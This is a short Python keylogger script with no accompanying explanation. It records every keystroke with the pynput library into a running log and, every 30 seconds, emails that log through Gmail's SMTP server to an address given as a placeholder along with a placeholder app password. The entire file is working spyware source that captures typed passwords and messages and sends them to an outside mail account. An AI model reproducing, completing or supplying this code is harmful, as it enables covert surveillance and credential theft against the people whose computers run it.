import pynput.keyboard
import smtplib
import threading

log = ""

def callback_function(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += str(key)

def send_email(email, app_password, message):
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as email_server:
            email_server.starttls()
            email_server.login(email, app_password)
            email_server.sendmail(email, email, message)
    except Exception as e:
        print(f"Error sending email: {e}")

def thread_function():
    global log
    send_email("user@gmail.com", "your_app_password", log)
    log = ""
    timer_object = threading.Timer(30, thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listener:
    thread_function()
    keylogger_listener.join()
